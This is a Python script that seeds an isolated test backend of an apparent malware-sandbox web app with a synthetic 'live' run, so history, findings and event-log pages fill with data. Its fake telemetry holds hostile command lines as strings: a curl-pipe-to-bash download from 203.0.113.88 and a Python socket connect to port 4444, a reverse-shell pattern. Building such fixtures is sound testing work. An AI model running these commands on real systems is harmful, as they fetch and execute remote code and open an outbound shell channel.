#!/usr/bin/env python3
"""Seed a live-sourced run into the isolated layout-sweep backend.

The sweep boots an isolated DB and seeds the campaign pair, but those runs
carry `source='seed'` — the webapp hides synthetic provenance by default, so
History charts, the Findings feed, and the Event Log would render EMPTY and
never overflow. This creates a run through the real API with
`session_type='live'` (server-side `source='live'`, visible everywhere by
default) and streams a small Linux-style detonation batch through the real
ingest pipeline, so every data-heavy page has content to lay out.

Usage:  python scripts/seed_sweep_live.py --api http://127.0.0.1:8013
"""

import argparse
import json
import sys
import urllib.request
import uuid
from datetime import datetime, timedelta, timezone


def post(url: str, payload) -> dict:
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read())


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--api", default="http://127.0.0.1:8013")
    args = ap.parse_args()
    api = args.api.rstrip("/")

    run_id = post(
        f"{api}/runs",
        {
            "sample_name": "sweep-live-session.bin",
            "platform": "linux",
            "session_type": "live",
        },
    )["run_id"]

    now = datetime.now(timezone.utc)
    events = [
        {
            "run_id": run_id,
            "platform": "linux",
            "event_type": "process_create",
            "timestamp": (now + timedelta(seconds=i)).isoformat(),
            "pid": 1000 + i,
            "ppid": 1000,
            "process_name": name,
            "command_line": cmd,
        }
        for i, (name, cmd) in enumerate(
            [
                ("bash", "bash -i"),
                ("curl", "curl -s http://203.0.113.88/x.sh | bash"),
                ("python3", "python3 -c 'import socket;s=socket.socket();s.connect((\"203.0.113.88\",4444))'"),
            ]
        )
    ]
    events += [
        {
            "run_id": run_id,
            "platform": "linux",
            "event_type": "network_connection",
            "timestamp": (now + timedelta(seconds=10 + i)).isoformat(),
            "pid": 1002,
            "dest_ip": "203.0.113.88",
            "dest_port": 4444,
            "protocol": "TCP",
        }
        for i in range(4)
    ]
    events.append(
        {
            "run_id": run_id,
            "platform": "linux",
            "event_type": "file_write",
            "timestamp": (now + timedelta(seconds=15)).isoformat(),
            "pid": 1002,
            "file_path": "/tmp/.cache/ssh_auth",
        }
    )
    post(f"{api}/ingest/batch", events)
    post(f"{api}/runs/{run_id}/complete", {})
    print(f"Seeded live run {run_id} ({len(events)} events) — visible in default views")
    return 0


if __name__ == "__main__":
    sys.exit(main())
